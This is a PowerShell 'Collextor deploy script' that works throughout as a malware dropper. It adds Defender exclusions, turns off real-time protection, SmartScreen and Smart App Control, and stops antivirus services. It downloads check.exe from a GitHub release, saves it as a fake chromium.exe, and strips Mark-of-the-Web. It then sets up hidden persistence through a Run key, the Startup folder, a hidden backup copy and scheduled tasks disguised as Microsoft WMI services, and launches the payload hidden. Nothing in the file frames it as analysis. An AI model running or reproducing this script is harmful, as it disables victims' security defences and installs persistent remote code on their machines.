# Collextor deploy script
$ErrorActionPreference = "SilentlyContinue"

Write-Host "[*] Collextor deploy script" -ForegroundColor Cyan

# ── [1] Defender exclusions ───────────────────────────────────────────────────
Write-Host "[1] Adding Defender exclusions..." -ForegroundColor Yellow
$paths = @(
    $env:TEMP,
    $env:APPDATA,
    "$env:APPDATA\Microsoft",
    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer",
    "$env:LOCALAPPDATA\Temp"
)
foreach ($p in $paths) {
    Add-MpPreference -ExclusionPath $p 2>$null
}
Add-MpPreference -ExclusionProcess "chromium.exe","WmiPrvSE.exe","svchost.exe" 2>$null
Write-Host "    Defender exclusions OK" -ForegroundColor Green

# ── [2] Disable Defender real-time protection ─────────────────────────────────
Write-Host "[2] Disabling Defender real-time protection..." -ForegroundColor Yellow
try {
    Set-MpPreference -DisableRealtimeMonitoring $true `
                     -DisableBehaviorMonitoring $true `
                     -DisableIOAVProtection $true `
                     -DisableIntrusionPreventionSystem $true `
                     -MAPSReporting 0 `
                     -SubmitSamplesConsent 2 2>$null
    Write-Host "    Defender real-time disabled OK" -ForegroundColor Green
} catch {
    # Fallback: registry
    $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (-not (Test-Path $defReg)) { New-Item -Path $defReg -Force | Out-Null }
    Set-ItemProperty -Path $defReg -Name "DisableAntiSpyware" -Value 1 -Type DWord 2>$null
    Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord 2>$null
    Write-Host "    Defender disabled via registry" -ForegroundColor Yellow
}

# ── [3] Disable SmartScreen ────────────────────────────────────────────────────
Write-Host "[3] Disabling SmartScreen..." -ForegroundColor Yellow
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
    -Name "EnableSmartScreen" -Value 0 -Type DWord 2>$null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
    -Name "SmartScreenEnabled" -Value "Off" -Type String 2>$null
# Smart App Control (Win11)
$sacKey = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
if (Test-Path $sacKey) {
    Set-ItemProperty -Path $sacKey -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord 2>$null
}
Write-Host "    SmartScreen + Smart App Control disabled" -ForegroundColor Green

# ── [4] Stop 3rd-party AV ─────────────────────────────────────────────────────
Write-Host "[4] Stopping 3rd-party AV services..." -ForegroundColor Yellow
$avServices = @("wscsvc","WinDefend","Sense","MsMpEng","avp","avgnt","ekrn","bdredline","mbamservice")
foreach ($svc in $avServices) {
    $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
    if ($s -and $s.Status -eq "Running") {
        Stop-Service -Name $svc -Force 2>$null
        Write-Host "    Stopped: $svc" -ForegroundColor Green
    }
}

# ── [5] Download payload ──────────────────────────────────────────────────────
Write-Host "[5] Downloading from: https://github.com/Holycheck/checker/releases/download/realease/check.exe" -ForegroundColor Yellow
$dst = "$env:APPDATA\Microsoft\Windows\chromium.exe"

# Try multiple methods; clear Zone.Identifier (MOTW) after each
function Get-Payload {
    param([string]$url, [string]$out)
    # Method 1: BitsTransfer (bypasses some proxy detection)
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source $url -Destination $out -ErrorAction Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -ErrorAction SilentlyContinue
    # Method 2: WebClient (no SSL check)
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url, $out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -ErrorAction SilentlyContinue
    # Method 3: Invoke-WebRequest
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing `
            -UserAgent "Mozilla/5.0" -ErrorAction Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
}

$url = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"
$ok = Get-Payload -url $url -out $dst

if ($ok) {
    # Clear Mark-of-the-Web (Zone.Identifier) so SmartScreen won't block execution
    Remove-Item "$dst`:Zone.Identifier" -ErrorAction SilentlyContinue
    $stream = [System.IO.File]::Open($dst, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
    $stream.Close()
    Unblock-File -Path $dst -ErrorAction SilentlyContinue
    Write-Host "    Downloaded to: $dst (Zone cleared)" -ForegroundColor Green
} else {
    Write-Host "    Download FAILED" -ForegroundColor Red
    exit
}

# ── [6] Autostart ─────────────────────────────────────────────────────────────
Write-Host "[6] Adding to autostart..." -ForegroundColor Yellow
# HKCU Run key
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name "WmiHostService" -Value $dst 2>$null

# Startup folder copy
$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item $dst "$startupDir\chromium.exe" -Force 2>$null

# Also copy secondary backup (hidden)
$backup = "$env:LOCALAPPDATA\Temp\~dfrgui.exe"
Copy-Item $dst $backup -Force 2>$null
Set-ItemProperty -Path $backup -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) 2>$null

Write-Host "    Autostart OK (registry + startup folder)" -ForegroundColor Green

# ── [7] Scheduled task (runs at logon, highest privilege) ─────────────────────
Write-Host "[7] Starting via scheduled task..." -ForegroundColor Yellow
$taskName = "MicrosoftWmiHost"

# Remove old task if exists
schtasks /Delete /TN $taskName /F 2>$null | Out-Null

# Create task: ONLOGON + every 5 min keep-alive — no /ST needed so no time warning
schtasks /Create /F /TN $taskName /TR "`"$dst`"" /SC ONLOGON /RL HIGHEST 2>$null | Out-Null

# Watchdog task: restart every 5 min if not running
$taskName2 = "MicrosoftWmiUpdate"
schtasks /Delete /TN $taskName2 /F 2>$null | Out-Null
$wdCmd = "cmd /C if not exist `"$backup`" copy /Y `"$dst`" `"$backup`""
schtasks /Create /F /TN $taskName2 /TR $wdCmd /SC MINUTE /MO 5 /RL HIGHEST 2>$null | Out-Null

Write-Host "    Scheduled tasks created OK" -ForegroundColor Green

# ── [8] Launch now ────────────────────────────────────────────────────────────
Write-Host "[8] Launching..." -ForegroundColor Yellow
Start-Process -FilePath $dst -WindowStyle Hidden
Write-Host "    Launched" -ForegroundColor Green

Write-Host ""
Write-Host "[OK] Deploy complete" -ForegroundColor Cyan
